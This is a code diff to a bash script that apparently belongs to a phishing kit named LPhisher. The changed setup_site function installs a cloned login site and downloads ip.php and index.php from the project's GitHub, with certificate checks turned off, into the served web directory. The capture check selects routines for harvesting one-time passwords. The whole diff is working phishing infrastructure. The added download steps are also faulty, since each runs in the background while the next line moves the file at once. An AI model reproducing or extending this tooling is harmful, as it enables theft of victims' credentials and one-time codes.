@@ -545,8 +545,22 @@ setup_site() {
 		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up site...${WHITE}"
 		unzip $zipfullname
 		mv $website/* .server/www
-		rm -rf .server/www/"$zipfullname"
+		rm -rf "$zipfullname"
 		rm -rf "$zipname"
+		if [ -f .server/assets/ip.php ]; then
+			cp .server/assets/ip.php .server/www
+		else
+			wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/LPhisher/main/.server/assets/ip.php > /dev/null 2>&1 &
+	                mv ip.php .server/assets
+			cp .server/assets/ip.php .server/www
+		fi
+		if [ -f .server/assets/index.php ]; then
+                        cp .server/assets/index.php .server/www
+                else
+                        wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/LPhisher/main/.server/assets/index.php > /dev/null 2>&1 &
+                        mv index.php .server/assets
+                        cp .server/assets/index.php .server/www
+                fi
 		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Setup complete..."${WHITE}
                 sleep 0.2
 		cusport
@@ -556,6 +570,7 @@ setup_site() {
 		clear
 		banner
 		echo -e "\n${RED}[${WHITE}!${RED}]${BLUE} Not able to download site"${WHITE}
+	fi
 }
 
 #Check whether link was generated properly
@@ -711,11 +726,11 @@ displayshortlink() {
 
 #Capture data check
 capture_data_check(){
-	if [ -f .sites/$website/NOTP ];then
+	if [ -f .server/www/NOTP ];then
                 capture_data_1
-        elif [ -f .sites/$website/OOTP ];then
+        elif [ -f .server/www/OOTP ];then
                 capture_data_2
-        elif [ -f .sites/$website/POTP ];then
+        elif [ -f .server/www/POTP ];then
                 capture_data_3
 	else
 		echo " Error Occured!!"
